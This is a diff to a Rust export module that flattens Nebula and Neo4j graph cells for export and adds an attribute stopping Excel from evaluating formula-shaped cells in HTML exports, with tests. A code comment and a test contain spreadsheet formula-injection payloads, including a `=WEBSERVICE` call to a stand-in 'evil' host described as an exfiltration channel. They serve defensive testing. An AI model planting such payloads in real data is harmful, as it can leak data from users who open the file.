@@ -1,6 +1,8 @@
 use serde::{Deserialize, Serialize};
 use serde_json::{Map, Value};
 
+use crate::csv_export::needs_formula_guard;
+
 #[derive(Debug, Clone, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
 pub struct QueryResultTextExportData {
@@ -8,6 +10,36 @@ pub struct QueryResultTextExportData {
     pub title: Option<String>,
     pub columns: Vec<String>,
     pub rows: Vec<Vec<Value>>,
+}
+
+pub fn normalize_nebula_export_rows(rows: &mut [Vec<Value>]) {
+    for value in rows.iter_mut().flatten() {
+        let graph_cell = value.get("__dbx_graph_cell").and_then(Value::as_str) == Some("nebula-v1")
+            && value.get("kind").is_some_and(Value::is_string)
+            && value.get("nodes").is_some_and(Value::is_array)
+            && value.get("edges").is_some_and(Value::is_array);
+        if graph_cell {
+            if let Some(display) = value.get("display").and_then(Value::as_str) {
+                *value = Value::String(display.to_owned());
+            }
+        }
+    }
+}
+
+pub fn normalize_neo4j_export_rows(rows: &mut [Vec<Value>]) {
+    for value in rows.iter_mut().flatten() {
+        let graph_cell = value.get("__dbx_graph_cell").and_then(Value::as_str) == Some("neo4j-v1")
+            && value.get("kind").is_some_and(Value::is_string)
+            && value.get("nodes").is_some_and(Value::is_array)
+            && value.get("edges").is_some_and(Value::is_array);
+        let node_cell = value.get("__dbx_neo4j_node").and_then(Value::as_str) == Some("v1")
+            && value.get("properties").is_some_and(Value::is_array);
+        if graph_cell || node_cell {
+            if let Some(display) = value.get("display").and_then(Value::as_str) {
+                *value = Value::String(display.to_owned());
+            }
+        }
+    }
 }
 
 pub fn format_json(data: &QueryResultTextExportData) -> Result<String, String> {
@@ -253,7 +285,8 @@ pub fn format_html(data: &QueryResultTextExportData) -> String {
     html.push_str("        <table>\n          <thead>\n            <tr>\n");
     for (index, col) in data.columns.iter().enumerate() {
         html.push_str(&format!(
-            "              <th><button class=\"sort-button\" type=\"button\" data-sort-column=\"{}\" aria-sort=\"none\">{}<span class=\"sort-indicator\" aria-hidden=\"true\">↕</span></button></th>\n",
+            "              <th{}><button class=\"sort-button\" type=\"button\" data-sort-column=\"{}\" aria-sort=\"none\">{}<span class=\"sort-indicator\" aria-hidden=\"true\">↕</span></button></th>\n",
+            html_formula_guard_attribute(col),
             index,
             html_escape(col)
         ));
@@ -264,10 +297,11 @@ pub fn format_html(data: &QueryResultTextExportData) -> String {
         html.push_str("            <tr>\n");
         for cell in row {
             let (text, css_class) = html_cell_value(cell);
+            let guard = html_formula_guard_attribute(&text);
             if css_class.is_empty() {
-                html.push_str(&format!("              <td>{}</td>\n", html_escape(&text)));
+                html.push_str(&format!("              <td{guard}>{}</td>\n", html_escape(&text)));
             } else {
-                html.push_str(&format!("              <td class=\"{}\">{}</td>\n", css_class, html_escape(&text)));
+                html.push_str(&format!("              <td class=\"{css_class}\"{guard}>{}</td>\n", html_escape(&text)));
             }
         }
         html.push_str("            </tr>\n");
@@ -367,6 +401,27 @@ pub fn format_html(data: &QueryResultTextExportData) -> String {
     html
 }
 
+/// Attribute that keeps Excel from evaluating an exported cell as a formula.
+///
+/// Excel reads an exported HTML table as sheet cells and evaluates a cell whose
+/// text looks like a formula, so a stored `=WEBSERVICE("https://evil/")` runs when
+/// the file is opened in a spreadsheet -- the same exfiltration channel #10542
+/// closed for CSV/TSV. This is measured on Excel 16.0: an unannotated `=1+1` cell
+/// arrives as the number 2, ` =cmd` executes after the leading space is dropped, and
+/// `-1+2` is promoted to `=-1+2`.
+///
+/// Excel's own text number format makes the cell plain text instead. Browsers ignore
+/// the `mso-` property, so the exported page still renders the value byte-for-byte --
+/// which matters because the HTML export's primary consumer is a browser, and the
+/// leading apostrophe the CSV/TSV writers use would be visible there.
+fn html_formula_guard_attribute(value: &str) -> &'static str {
+    if needs_formula_guard(value) {
+        r##" style="mso-number-format:'\@'""##
+    } else {
+        ""
+    }
+}
+
 fn html_escape(value: &str) -> String {
     let mut out = String::with_capacity(value.len());
     for ch in value.chars() {
@@ -403,7 +458,114 @@ fn chrono_local_now() -> String {
 mod tests {
     use serde_json::{json, Value};
 
-    use super::{format_html, format_json, format_markdown, QueryResultTextExportData};
+    use super::{
+        format_html, format_json, format_markdown, normalize_nebula_export_rows, normalize_neo4j_export_rows,
+        QueryResultTextExportData,
+    };
+
+    #[test]
+    fn nebula_exports_use_display_cells_without_leaking_graph_metadata() {
+        let mut rows = vec![
+            vec![
+                json!({
+                    "__dbx_graph_cell": "nebula-v1", "kind": "vertex", "display": "(:\"player\" {\"name\":\"Tim\"})",
+                    "nodes": [{"id": "vid:1", "labels": ["player"], "properties": [{"name": "name", "value": "Tim"}]}], "edges": []
+                }),
+                json!(false),
+                Value::Null,
+            ],
+            vec![
+                json!({"__dbx_graph_cell": "nebula-v1", "kind": "edge", "display": "[:follow]", "nodes": [], "edges": [{"type": "follow"}]}),
+                json!(7),
+                json!("plain"),
+            ],
+        ];
+        normalize_nebula_export_rows(&mut rows);
+        assert_eq!(rows[0], vec![json!("(:\"player\" {\"name\":\"Tim\"})"), json!(false), Value::Null]);
+        assert_eq!(rows[1], vec![json!("[:follow]"), json!(7), json!("plain")]);
+        let data = QueryResultTextExportData {
+            title: None,
+            columns: vec!["entity".into(), "value".into(), "note".into()],
+            rows,
+        };
+        let exported: Value = serde_json::from_str(&format_json(&data).unwrap()).unwrap();
+        assert_eq!(exported[0]["entity"], json!("(:\"player\" {\"name\":\"Tim\"})"));
+        assert!(!format_markdown(&data).contains("__dbx_graph_cell"));
+    }
+
+    #[test]
+    fn nebula_export_normalization_preserves_ordinary_and_unknown_objects() {
+        let mut rows = vec![vec![
+            json!({"display": "ordinary", "properties": []}),
+            json!({"__dbx_graph_cell": "neo4j-v1", "kind": "vertex", "display": "neo4j", "nodes": [], "edges": []}),
+            json!({"__dbx_graph_cell": "nebula-v2", "kind": "vertex", "display": "future", "nodes": [], "edges": []}),
+            json!({"__dbx_graph_cell": "nebula-v1", "kind": "vertex", "display": 42, "nodes": [], "edges": []}),
+            json!({"__dbx_graph_cell": "nebula-v1", "kind": "vertex", "display": "malformed", "nodes": null, "edges": []}),
+        ]];
+        let original = rows.clone();
+        normalize_nebula_export_rows(&mut rows);
+        assert_eq!(rows[0][0], json!({"display": "ordinary", "properties": []}));
+        assert_eq!(rows[0][1], original[0][1]);
+        assert_eq!(rows[0][2], original[0][2]);
+        assert_eq!(rows[0][3], original[0][3]);
+        assert_eq!(rows[0][4], original[0][4]);
+    }
+
+    #[test]
+    fn neo4j_exports_use_display_cells_without_leaking_graph_metadata() {
+        let displays = [
+            ("vertex", "(:Person {\"count\":9007199254740993})"),
+            ("edge", "[:KNOWS]"),
+            ("path", "{\"nodes\":[],\"relationships\":[]}"),
+            ("map", "{\"count\":9007199254740993,\"node\":{\"labels\":[\"Person\"]}}"),
+        ];
+        let mut rows = displays
+            .iter()
+            .map(|(kind, display)| {
+                vec![
+                    json!({
+                        "__dbx_graph_cell": "neo4j-v1", "kind": kind, "display": display,
+                        "nodes": [], "edges": [], "displayParts": ["internal metadata"]
+                    }),
+                    json!(false),
+                    Value::Null,
+                ]
+            })
+            .collect::<Vec<_>>();
+        rows.push(vec![
+            json!({"__dbx_neo4j_node":"v1", "display":"(:Legacy)", "properties": []}),
+            json!(7),
+            json!("plain"),
+        ]);
+        normalize_neo4j_export_rows(&mut rows);
+        for (index, (_, display)) in displays.iter().enumerate() {
+            assert_eq!(rows[index], vec![json!(display), json!(false), Value::Null]);
+        }
+        assert_eq!(rows[4], vec![json!("(:Legacy)"), json!(7), json!("plain")]);
+        let data = QueryResultTextExportData {
+            title: None,
+            columns: vec!["entity".into(), "value".into(), "note".into()],
+            rows,
+        };
+        let exported: Value = serde_json::from_str(&format_json(&data).unwrap()).unwrap();
+        assert_eq!(exported[0]["entity"], json!(displays[0].1));
+        assert_eq!(exported[1]["entity"], json!("[:KNOWS]"));
+        assert!(!format_markdown(&data).contains("__dbx_graph_cell"));
+    }
+
+    #[test]
+    fn neo4j_export_normalization_preserves_ordinary_and_unknown_objects() {
+        let mut rows = vec![vec![
+            json!({"display":"ordinary", "properties":[]}),
+            json!({"__dbx_graph_cell":"nebula-v1", "kind":"vertex", "display":"nebula", "nodes":[], "edges":[]}),
+            json!({"__dbx_graph_cell":"neo4j-v2", "kind":"vertex", "display":"future", "nodes":[], "edges":[]}),
+            json!({"__dbx_graph_cell":"neo4j-v1", "kind":"vertex", "display":42, "nodes":[], "edges":[]}),
+            json!({"__dbx_graph_cell":"neo4j-v1", "kind":"vertex", "display":"malformed", "nodes":null, "edges":[]}),
+        ]];
+        let original = rows.clone();
+        normalize_neo4j_export_rows(&mut rows);
+        assert_eq!(rows, original);
+    }
 
     #[test]
     fn formats_json_rows_as_objects() {
@@ -525,6 +687,51 @@ mod tests {
         assert!(out.contains("&lt;script&gt;"));
         assert!(out.contains("&amp; &quot;quoted&quot;"));
         assert!(out.contains("&#39;x&#39;"), "single quotes must be escaped");
+    }
+
+    #[test]
+    fn formats_html_keeps_excel_from_evaluating_formula_shaped_cells() {
+        // Excel reads an exported HTML table as sheet cells. Without the text number
+        // format a stored `=WEBSERVICE(...)` runs on open, ` =cmd` runs after the
+        // leading space is dropped, and `-1+2` is promoted to a formula; `+2` is
+        // silently coerced to the number 2, losing the sign. The attribute has to be
+        // on the cell itself and correctly terminated, and the value must stay
+        // untouched so a browser renders exactly what the database holds.
+        const TEXT_FORMAT: &str = " style=\"mso-number-format:'\\@'\"";
+        let guarded = |value: &str| format!("<td{TEXT_FORMAT}>{value}</td>");
+
+        let out = format_html(&QueryResultTextExportData {
+            title: None,
+            columns: vec!["=evil".to_string(), "plain".to_string()],
+            rows: vec![vec![
+                json!("=WEBSERVICE(\"https://evil/\")"),
+                json!("plain"),
+                json!("+2"),
+                json!("-1+2"),
+                json!(" =cmd"),
+                json!("-note"),
+                json!("@x"),
+                json!(42),
+                Value::Null,
+            ]],
+        });
+
+        // The same predicate the CSV/TSV writers use decides which cells are guarded.
+        for value in ["=WEBSERVICE(&quot;https://evil/&quot;)", "+2", "-1+2", " =cmd", "-note", "@x"] {
+            assert!(out.contains(&guarded(value)), "cell {value:?} must carry the text number format");
+        }
+        // Column names reach the sheet too, so a formula-shaped header is covered.
+        assert!(
+            out.contains(&format!("<th{TEXT_FORMAT}><button class=\"sort-button\"")),
+            "a formula-shaped header must carry the text number format"
+        );
+
+        // Cells Excel treats as text anyway keep the plain form, and the guard never
+        // rewrites the value (no apostrophe, unlike the CSV/TSV writers).
+        assert!(out.contains("<td>plain</td>"));
+        assert!(out.contains("<td class=\"number\">42</td>"));
+        assert!(out.contains("<td class=\"null\">NULL</td>"));
+        assert!(!out.contains("'="), "the value itself must not be prefixed");
     }
 
     #[test]
